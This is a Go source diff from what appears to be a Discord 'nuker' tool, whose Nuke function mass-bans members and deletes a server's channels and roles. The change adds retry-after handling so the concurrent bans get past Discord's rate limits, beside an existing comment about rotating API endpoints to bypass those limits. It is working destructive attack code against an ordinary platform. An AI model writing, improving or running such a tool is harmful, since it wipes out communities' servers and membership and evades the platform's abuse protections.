@@ -19,7 +19,6 @@ func Nuke() {
 	banUsers()
 	getData(roleArray, "https://discord.com/api/v8/guilds/%s/roles", "id", "")
 	deleteRoles()
-	utils.SendRequest("PATCH", fmt.Sprintf("https://discord.com/api/v8/guilds/%s", guildID), "application/json")
 	fmt.Printf("Deleted %d channels, %d roles, banned %d people\n", channelsDeleted, rolesDeleted, bancount)
 }
 
@@ -60,17 +59,22 @@ func deleteChannels() {
 func banUsers() {
 	wg := new(sync.WaitGroup)
 	s := rand.New(rand.NewSource(time.Now().UnixNano()))
+	fmt.Println(len(memberArray))
 	for user := range memberArray {
 		wg.Add(1)
 		go func(userID string) {
+			timeout := ban(s, userID)
+			if timeout != 0 {
+				time.Sleep(timeout)
+				ban(s, userID)
+			}
 			defer wg.Done()
-			ban(s, userID)
 		}(user) // this code is really hacky why am I doing this ¯\_(ツ)_/¯
 	}
 	wg.Wait()
 }
 
-func ban(randm *rand.Rand, userID string) {
+func ban(randm *rand.Rand, userID string) time.Duration {
 	randomint := randm.Intn(3)
 	switch randomint {
 	// Multiple APIs to bypass the rate limit.
@@ -84,7 +88,17 @@ func ban(randm *rand.Rand, userID string) {
 	res := utils.SendRequest("PUT", url, "")
 	if res.StatusCode() == 204 {
 		bancount++
+		return 0
 	}
+	jsonRes, err := parser.Parse(string(res.Body()))
+	if err != nil {
+		panic(fmt.Sprintf("Couldn't parse json data: %s", err.Error()))
+	}
+	RetryAfter := jsonRes.GetInt("retry_after")
+	if RetryAfter != 0 {
+		return time.Duration(RetryAfter) * time.Millisecond
+	}
+	return 0
 }
 
 var (
